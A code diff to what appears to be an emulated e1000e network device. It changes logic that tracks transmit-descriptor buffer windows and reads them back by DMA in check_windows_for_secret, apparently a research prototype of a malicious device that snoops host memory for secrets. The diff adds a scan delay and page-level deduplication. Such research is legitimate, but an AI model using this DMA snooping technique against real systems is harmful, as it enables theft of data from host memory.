@@ -33,6 +33,7 @@
 * License along with this library; if not, see <http://www.gnu.org/licenses/>.
 */
 #include <sys/queue.h>
+#include <time.h>
 
 #include "pcie.h"
 #include "pcie-debug.h"
@@ -3828,6 +3829,8 @@ struct window_list_entry {
 	LIST_ENTRY(window_list_entry) window_list;
 };
 
+clock_t start_time;
+
 /* I don't like using the constructor attribute, but it's the simplest way to
  * go about this.
  */
@@ -3840,14 +3843,15 @@ initialise_window_list()
 	window_list_length = 0;
 	window_list_min_length = 0;
 	window_list_max_length = 0;
+	start_time = clock();
 }
 
 static inline void
 adjust_window_list_length(int diff)
 {
 	window_list_length += diff;
-	printf("%d ", window_list_length);
-	fflush(stdout);
+	/*printf("%d ", window_list_length);*/
+	/*fflush(stdout);*/
 	/*if (window_list_length > window_list_max_length) {*/
 		/*window_list_max_length = window_list_length;*/
 		/*printf("Window list new max length: %d.\n", window_list_length);*/
@@ -3877,6 +3881,12 @@ check_windows_for_secret(E1000ECore *core)
 	uint8_t page[4096];
 	struct window_list_entry *entry, *temp;
 
+	if ((clock() - start_time) < 40000) {
+		return;
+	}
+
+	putchar('c'); fflush(stdout);
+
 	LIST_FOREACH_SAFE(entry, &window_list_head, window_list, temp) {
 		read_result = perform_dma_long_read(page, entry->window.length,
 			core->owner->devfn, 8, entry->window.base);
@@ -3896,7 +3906,7 @@ record_tx_windows_from_descriptor_address(E1000ECore *core,
 {
 	/*putchar('w');*/
 	/*fflush(stdout);*/
-	struct window_list_entry *entry;
+	struct window_list_entry *entry, *temp;
 
 	struct e1000_tx_desc desc;
 	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
@@ -3905,17 +3915,20 @@ record_tx_windows_from_descriptor_address(E1000ECore *core,
 	window.base = le64_to_cpu(desc.buffer_addr);
 	window.length = le16_to_cpu(desc.lower.flags.length);
 
-	if (!window_in_list(window)) {
-		/*putchar('a');*/
-		/*fflush(stdout);*/
-		entry = malloc(sizeof(struct window_list_entry));
-		entry->window = window;
-		LIST_INSERT_HEAD(&window_list_head, entry, window_list);
-		adjust_window_list_length(1);
-		/*fputs("Adding ", stdout);*/
-		/*print_window(entry);*/
-		/*putchar('\n');*/
+	uint64_t window_page_base_address = page_base_address(window.base);
+
+	LIST_FOREACH_SAFE(entry, &window_list_head, window_list, temp) {
+		if (page_base_address(entry->window.base) == window_page_base_address) {
+			LIST_REMOVE(entry, window_list);
+			adjust_window_list_length(-1);
+			free(entry);
+		}
 	}
+
+	entry = malloc(sizeof(struct window_list_entry));
+	entry->window = window;
+	LIST_INSERT_HEAD(&window_list_head, entry, window_list);
+	adjust_window_list_length(1);
 
 	check_windows_for_secret(core);
 }
